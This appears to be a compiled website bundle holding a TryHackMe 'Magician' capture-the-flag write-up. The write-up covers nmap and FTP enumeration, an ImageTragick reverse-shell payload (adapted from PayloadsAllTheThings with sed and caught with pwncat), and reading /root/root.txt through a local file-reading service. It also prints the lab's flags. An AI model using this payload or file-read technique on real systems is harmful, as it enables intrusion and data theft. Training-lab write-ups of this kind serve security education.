"use strict";(self.webpackChunkcyfun_me=self.webpackChunkcyfun_me||[]).push([[5796],{3905:(e,t,n)=>{n.d(t,{Zo:()=>c,kt:()=>d});var a=n(67294);function o(e,t,n){return t in e?Object.defineProperty(e,t,{value:n,enumerable:!0,configurable:!0,writable:!0}):e[t]=n,e}function r(e,t){var n=Object.keys(e);if(Object.getOwnPropertySymbols){var a=Object.getOwnPropertySymbols(e);t&&(a=a.filter((function(t){return Object.getOwnPropertyDescriptor(e,t).enumerable}))),n.push.apply(n,a)}return n}function i(e){for(var t=1;t<arguments.length;t++){var n=null!=arguments[t]?arguments[t]:{};t%2?r(Object(n),!0).forEach((function(t){o(e,t,n[t])})):Object.getOwnPropertyDescriptors?Object.defineProperties(e,Object.getOwnPropertyDescriptors(n)):r(Object(n)).forEach((function(t){Object.defineProperty(e,t,Object.getOwnPropertyDescriptor(n,t))}))}return e}function l(e,t){if(null==e)return{};var n,a,o=function(e,t){if(null==e)return{};var n,a,o={},r=Object.keys(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||(o[n]=e[n]);return o}(e,t);if(Object.getOwnPropertySymbols){var r=Object.getOwnPropertySymbols(e);for(a=0;a<r.length;a++)n=r[a],t.indexOf(n)>=0||Object.prototype.propertyIsEnumerable.call(e,n)&&(o[n]=e[n])}return o}var s=a.createContext({}),p=function(e){var t=a.useContext(s),n=t;return e&&(n="function"==typeof e?e(t):i(i({},t),e)),n},c=function(e){var t=p(e.components);return a.createElement(s.Provider,{value:t},e.children)},u="mdxType",m={inlineCode:"code",wrapper:function(e){var t=e.children;return a.createElement(a.Fragment,{},t)}},h=a.forwardRef((function(e,t){var n=e.components,o=e.mdxType,r=e.originalType,s=e.parentName,c=l(e,["components","mdxType","originalType","parentName"]),u=p(n),h=o,d=u["".concat(s,".").concat(h)]||u[h]||m[h]||r;return n?a.createElement(d,i(i({ref:t},c),{},{components:n})):a.createElement(d,i({ref:t},c))}));function d(e,t){var n=arguments,o=t&&t.mdxType;if("string"==typeof e||o){var r=n.length,i=new Array(r);i[0]=h;var l={};for(var s in t)hasOwnProperty.call(t,s)&&(l[s]=t[s]);l.originalType=e,l[u]="string"==typeof e?e:o,i[1]=l;for(var p=2;p<r;p++)i[p]=n[p];return a.createElement.apply(null,i)}return a.createElement.apply(null,n)}h.displayName="MDXCreateElement"},16687:(e,t,n)=>{n.r(t),n.d(t,{assets:()=>s,contentTitle:()=>i,default:()=>m,frontMatter:()=>r,metadata:()=>l,toc:()=>p});var a=n(87462),o=(n(67294),n(3905));const r={},i="Magician",l={unversionedId:"Tryhackme/Magician/Magician",id:"Tryhackme/Magician/Magician",title:"Magician",description:"This magical website lets you convert image file formats",source:"@site/writeups/Tryhackme/Magician/Magician.md",sourceDirName:"Tryhackme/Magician",slug:"/Tryhackme/Magician/",permalink:"/writeups/Tryhackme/Magician/",draft:!1,tags:[],version:"current",frontMatter:{},sidebar:"tutorialSidebar",previous:{title:"Madness",permalink:"/writeups/Tryhackme/Madness/"},next:{title:"Metaspliot",permalink:"/writeups/Tryhackme/Metaspliot/Metasploit"}},s={},p=[{value:"\ud83d\udca2 We will cover  the topics",id:"-we-will-cover--the-topics",level:2},{value:"Network enumeration",id:"network-enumeration",level:2},{value:"FTP discovery",id:"ftp-discovery",level:2},{value:"Web discovery",id:"web-discovery",level:2},{value:"Web exploitation",id:"web-exploitation",level:2},{value:"Elevation of privilege (EoP): from magician to root",id:"elevation-of-privilege-eop-from-magician-to-root",level:2}],c={toc:p},u="wrapper";function m(e){let{components:t,...r}=e;return(0,o.kt)(u,(0,a.Z)({},c,r,{components:t,mdxType:"MDXLayout"}),(0,o.kt)("h1",{id:"magician"},"Magician"),(0,o.kt)("p",null,"This magical website lets you convert image file formats"),(0,o.kt)("p",null,(0,o.kt)("img",{alt:"magician",src:n(28734).Z,width:"1222",height:"1164"})),(0,o.kt)("p",null,(0,o.kt)("a",{parentName:"p",href:"https://tryhackme.com/room/magician"},"Magician")),(0,o.kt)("h2",{id:"-we-will-cover--the-topics"},"\ud83d\udca2 We will cover  the topics"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"Network Enumeration"),(0,o.kt)("li",{parentName:"ul"},"Web Exploitation"),(0,o.kt)("li",{parentName:"ul"},"FTP Services"),(0,o.kt)("li",{parentName:"ul"},"EOP"),(0,o.kt)("li",{parentName:"ul"},"Image Manipulation"),(0,o.kt)("li",{parentName:"ul"},"Cryptography")),(0,o.kt)("h1",{id:"task-1-find-the-flags"},"Task 1 Find the flags!"),(0,o.kt)("p",null,"Install tools used in this room on Arch Linux:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre"},"$ sudo pacman -S nmap payloadsallthethings ruby-ctf-party pwncat\n")),(0,o.kt)("h2",{id:"network-enumeration"},"Network enumeration"),(0,o.kt)("p",null,"Port and service scan with nmap:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},'# Nmap 7.91 scan initiated Tue Feb 23 20:19:29 2021 as: nmap -sSVC -p- -v -oA nmap_scan 10.10.2.188\nNmap scan report for magician (10.10.2.188)\nHost is up (0.033s latency).\nNot shown: 65532 closed ports\nPORT     STATE SERVICE    VERSION\n21/tcp   open  ftp        vsftpd 2.0.8 or later\n8080/tcp open  http-proxy\n| fingerprint-strings:\n|   FourOhFourRequest:\n|     HTTP/1.1 404\n|     Vary: Origin\n|     Vary: Access-Control-Request-Method\n|     Vary: Access-Control-Request-Headers\n|     Content-Type: application/json\n|     Date: Tue, 23 Feb 2021 19:20:28 GMT\n|     Connection: close\n|     {"timestamp":"2021-02-23T19:20:29.162+0000","status":404,"error":"Not Found","message":"No message available","path":"/nice%20ports%2C/Tri%6Eity.txt%2ebak"}\n|   HTTPOptions:\n|     HTTP/1.1 404\n|     Vary: Origin\n|     Vary: Access-Control-Request-Method\n|     Vary: Access-Control-Request-Headers\n|     Content-Type: application/json\n|     Date: Tue, 23 Feb 2021 19:20:27 GMT\n|     Connection: close\n|     {"timestamp":"2021-02-23T19:20:24.427+0000","status":404,"error":"Not Found","message":"No message available","path":"/"}\n|   RTSPRequest:\n|     HTTP/1.1 505\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 465\n|     Date: Tue, 23 Feb 2021 19:20:28 GMT\n|     <!doctype html><html lang="en"><head><title>HTTP Status 505\n|     HTTP Version Not Supported</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 505\n|     HTTP Version Not Supported</h1></body></html>\n|   Socks5:\n|     HTTP/1.1 400\n|     Content-Type: text/html;charset=utf-8\n|     Content-Language: en\n|     Content-Length: 435\n|     Date: Tue, 23 Feb 2021 19:20:28 GMT\n|     Connection: close\n|     <!doctype html><html lang="en"><head><title>HTTP Status 400\n|     Request</title><style type="text/css">body {font-family:Tahoma,Arial,sans-serif;} h1, h2, h3, b {color:white;background-color:#525D76;} h1 {font-size:22px;} h2 {font-size:16px;} h3 {font-size:14px;} p {font-size:12px;} a {color:black;} .line {height:1px;background-color:#525D76;border:none;}</style></head><body><h1>HTTP Status 400\n|_    Request</h1></body></html>\n|_http-title: Site doesn\'t have a title (application/json).\n8081/tcp open  http       nginx 1.14.0 (Ubuntu)\n|_http-favicon: Unknown favicon MD5: CA4D0E532A1010F93901DFCB3A9FC682\n| http-methods:\n|_  Supported Methods: GET HEAD\n|_http-server-header: nginx/1.14.0 (Ubuntu)\n|_http-title: magician\n1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :\nSF-Port8080-TCP:V=7.91%I=7%D=2/23%Time=6035557C%P=x86_64-unknown-linux-gnu\nSF:%r(HTTPOptions,13B,"HTTP/1\\.1\\x20404\\x20\\r\\nVary:\\x20Origin\\r\\nVary:\\x2\nSF:0Access-Control-Request-Method\\r\\nVary:\\x20Access-Control-Request-Heade\nSF:rs\\r\\nContent-Type:\\x20application/json\\r\\nDate:\\x20Tue,\\x2023\\x20Feb\\x\nSF:202021\\x2019:20:27\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n{\\"timestamp\\"\nSF::\\"2021-02-23T19:20:24\\.427\\+0000\\",\\"status\\":404,\\"error\\":\\"Not\\x20F\nSF:ound\\",\\"message\\":\\"No\\x20message\\x20available\\",\\"path\\":\\"/\\"}")%r(R\nSF:TSPRequest,259,"HTTP/1\\.1\\x20505\\x20\\r\\nContent-Type:\\x20text/html;char\nSF:set=utf-8\\r\\nContent-Language:\\x20en\\r\\nContent-Length:\\x20465\\r\\nDate:\nSF:\\x20Tue,\\x2023\\x20Feb\\x202021\\x2019:20:28\\x20GMT\\r\\n\\r\\n<!doctype\\x20ht\nSF:ml><html\\x20lang=\\"en\\"><head><title>HTTP\\x20Status\\x20505\\x20\\xe2\\x80\\\nSF:x93\\x20HTTP\\x20Version\\x20Not\\x20Supported</title><style\\x20type=\\"text\nSF:/css\\">body\\x20{font-family:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20\nSF:h3,\\x20b\\x20{color:white;background-color:#525D76;}\\x20h1\\x20{font-size\nSF::22px;}\\x20h2\\x20{font-size:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{\nSF:font-size:12px;}\\x20a\\x20{color:black;}\\x20\\.line\\x20{height:1px;backgr\nSF:ound-color:#525D76;border:none;}</style></head><body><h1>HTTP\\x20Status\nSF:\\x20505\\x20\\xe2\\x80\\x93\\x20HTTP\\x20Version\\x20Not\\x20Supported</h1></bo\nSF:dy></html>")%r(FourOhFourRequest,15E,"HTTP/1\\.1\\x20404\\x20\\r\\nVary:\\x20\nSF:Origin\\r\\nVary:\\x20Access-Control-Request-Method\\r\\nVary:\\x20Access-Con\nSF:trol-Request-Headers\\r\\nContent-Type:\\x20application/json\\r\\nDate:\\x20T\nSF:ue,\\x2023\\x20Feb\\x202021\\x2019:20:28\\x20GMT\\r\\nConnection:\\x20close\\r\\n\nSF:\\r\\n{\\"timestamp\\":\\"2021-02-23T19:20:29\\.162\\+0000\\",\\"status\\":404,\\"\nSF:error\\":\\"Not\\x20Found\\",\\"message\\":\\"No\\x20message\\x20available\\",\\"p\nSF:ath\\":\\"/nice%20ports%2C/Tri%6Eity\\.txt%2ebak\\"}")%r(Socks5,24E,"HTTP/1\nSF:\\.1\\x20400\\x20\\r\\nContent-Type:\\x20text/html;charset=utf-8\\r\\nContent-L\nSF:anguage:\\x20en\\r\\nContent-Length:\\x20435\\r\\nDate:\\x20Tue,\\x2023\\x20Feb\\\nSF:x202021\\x2019:20:28\\x20GMT\\r\\nConnection:\\x20close\\r\\n\\r\\n<!doctype\\x20\nSF:html><html\\x20lang=\\"en\\"><head><title>HTTP\\x20Status\\x20400\\x20\\xe2\\x8\nSF:0\\x93\\x20Bad\\x20Request</title><style\\x20type=\\"text/css\\">body\\x20{fon\nSF:t-family:Tahoma,Arial,sans-serif;}\\x20h1,\\x20h2,\\x20h3,\\x20b\\x20{color:\nSF:white;background-color:#525D76;}\\x20h1\\x20{font-size:22px;}\\x20h2\\x20{f\nSF:ont-size:16px;}\\x20h3\\x20{font-size:14px;}\\x20p\\x20{font-size:12px;}\\x2\nSF:0a\\x20{color:black;}\\x20\\.line\\x20{height:1px;background-color:#525D76;\nSF:border:none;}</style></head><body><h1>HTTP\\x20Status\\x20400\\x20\\xe2\\x80\nSF:\\x93\\x20Bad\\x20Request</h1></body></html>");\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n\nRead data files from: /usr/bin/../share/nmap\nService detection performed. Please report any incorrect results at https://nmap.org/submit/ .\n# Nmap done at Tue Feb 23 20:20:52 2021 -- 1 IP address (1 host up) scanned in 83.04 seconds\n')),(0,o.kt)("p",null,"We have:"),(0,o.kt)("ul",null,(0,o.kt)("li",{parentName:"ul"},"8081: a web app converting images (PNG to JPG)"),(0,o.kt)("li",{parentName:"ul"},"8080: ",(0,o.kt)("inlineCode",{parentName:"li"},"WhiteLabel Error Page")," which is a default generic Spring Boot error page"),(0,o.kt)("li",{parentName:"ul"},"21: a FTP server")),(0,o.kt)("p",null,"Add an entry in our hosts file:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ grep magician /etc/hosts\n10.10.2.188 magician\n")),(0,o.kt)("h2",{id:"ftp-discovery"},"FTP discovery"),(0,o.kt)("p",null,"NSE script found nothing about the FTP server (no anonymous connection) but\ntrying manually on the CLI we get a quite different result:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ ftp 10.10.2.188\nConnected to 10.10.2.188.\n220 THE MAGIC DOOR\nName (10.10.2.188:cyfun): anonymous\n331 Please specify the password.\nPassword:\n230-Huh? The door just opens after some time? You're quite the patient one, aren't ya, it's a thing called 'delay_successful_login' in /etc/vsftpd.conf ;) Since you're a rookie, this might help you to get started: https://imagetragick.com. You might need to do some little tweaks though...\n230 Login successful.\n")),(0,o.kt)("p",null,"NSE script must have timeout due to ",(0,o.kt)("inlineCode",{parentName:"p"},"delay_successful_login"),"."),(0,o.kt)("p",null,"We have access denied on FTP, it was just to give us a hint: imagetragick."),(0,o.kt)("p",null,"Honestly it doesn't helped since the named of the box is ",(0,o.kt)("inlineCode",{parentName:"p"},"magician")," and the\napp is about image conversion I know it was about exploiting\nan ","[ImageMagick][1]"," vulnerability."),(0,o.kt)("h2",{id:"web-discovery"},"Web discovery"),(0,o.kt)("p",null,"Uploading PNG at ",(0,o.kt)("a",{parentName:"p",href:"http://10.10.2.188:8081/"},"http://10.10.2.188:8081/")," doesn't work, but at http://magician:8081/\nit works as told in the box intro."),(0,o.kt)("h2",{id:"web-exploitation"},"Web exploitation"),(0,o.kt)("p",null,"As we already know we should exploit imagetragick, let's get to it directly,\ncopying the payload and replacing the placeholder with our IP and port."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ cp /usr/share/payloadsallthethings/Upload\\ Insecure\\ Files/Picture\\ Image\\ Magik/imagetragik1_payload_imageover_reverse_shell_devtcp.jpg .\n$ sed -i 's/ip/10.9.19.77/' imagetragik1_payload_imageover_reverse_shell_devtcp.jpg\n$ sed -i 's/80/9999/' imagetragik1_payload_imageover_reverse_shell_devtcp.jpg\n")),(0,o.kt)("p",null,"The vuln is triggered right after upload completion."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},"$ pwncat -l 9999 -vv\nINFO: Listening on :::9999 (family 10/IPv6, TCP)\nINFO: Listening on 0.0.0.0:9999 (family 2/IPv4, TCP)\nINFO: Client connected from 10.10.2.188:33672 (family 2/IPv4, TCP)\nsh: cannot set terminal process group (978): Inappropriate ioctl for device\nsh: no job control in this shell\nsh-4.4$ id\nuid=1000(magician) gid=1000(magician) groups=1000(magician)\nsh-4.4$ pwd\n/tmp/hsperfdata_magician\nsh-4.4$ ls /home\nmagician\nsh-4.4$ cd\nsh-4.4$ pwd\n/home/magician\nsh-4.4$ cat user.txt\nTHM{edited}\n")),(0,o.kt)("p",null,"user flag: {% spoiler ",(0,o.kt)("inlineCode",{parentName:"p"},"THM{simsalabim_hex_hex}")," %}"),(0,o.kt)("h2",{id:"elevation-of-privilege-eop-from-magician-to-root"},"Elevation of privilege (EoP): from magician to root"),(0,o.kt)("p",null,"A hint was left to us:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},"sh-4.4$ cat the_magic_continues\nThe magician is known to keep a locally listening cat up his sleeve, it is said to be an oracle who will tell you secrets if you are good enough to understand its meows.\n")),(0,o.kt)("p",null,"There must be a local service."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},'sh-4.4$ ss -nlpt\nState    Recv-Q    Send-Q        Local Address:Port        Peer Address:Port\nLISTEN   0         128                 0.0.0.0:8081             0.0.0.0:*\nLISTEN   0         128           127.0.0.53%lo:53               0.0.0.0:*\nLISTEN   0         128               127.0.0.1:6666             0.0.0.0:*\nLISTEN   0         100                       *:8080                   *:*        users:(("java",pid=915,fd=25))\nLISTEN   0         32                        *:21                     *:*\n')),(0,o.kt)("p",null,"There something on port 6666."),(0,o.kt)("p",null,"Let's see if it's a web app:"),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},'sh-4.4$ curl http://127.0.0.1:6666\n...\n<form action="" method="post" class="form" role="form">\n    <div class="form-group ">\n        <label class="control-label" for="filename">Enter filename</label>\n        <input class="form-control" id="filename" name="filename" type="text" value="">\n    </div>\n    <input class="btn btn-default" id="submit" name="submit" type="submit" value="Submit">\n</form>\n...\n')),(0,o.kt)("p",null,"We could use some ","[pivoting techniques][2]"," but that won't be necessary here as\nthe case is very simple."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-plaintext"},"sh-4.4$ curl http://127.0.0.1:6666 -s -X POST --data 'filename=/root/root.txt'\n...\n<pre class=\"page-header\">\n1010100 1001000 1001101 1111011 1101101 1100001 1100111 1101001 1100011 1011111 1101101 1100001 1111001 1011111 1101101 1100001 1101011 1100101 1011111 1101101 1100001 1101110 1111001 1011111 1101101 1100101 1101110 1011111 1101101 1100001 1100100 1111101 1010\n</pre>\n...\n")),(0,o.kt)("p",null,"Decoding the binary gave nothing, I tried a second type and got a flag\nencoded with caesar cipher: ",(0,o.kt)("inlineCode",{parentName:"p"},"GUZ{zntvp_znl_znxr_znal_zra_znq}"),"."),(0,o.kt)("p",null,"I decoded it with ","[ctf-party][3]","."),(0,o.kt)("pre",null,(0,o.kt)("code",{parentName:"pre",className:"language-ruby"},"ctf_party_console\nirb(main):001:0> 'GUZ{zntvp_znl_znxr_znal_zra_znq}'.rot13\n=> \"THM{edited}\"\n")),(0,o.kt)("p",null,"root flag: {% spoiler ",(0,o.kt)("inlineCode",{parentName:"p"},"THM{magic_may_make_many_men_mad}")," %}"))}m.isMDXComponent=!0},28734:(e,t,n)=>{n.d(t,{Z:()=>a});const a=n.p+"assets/images/magician-e5d4356083f9ad3872c07fb4b826d8a6.png"}}]);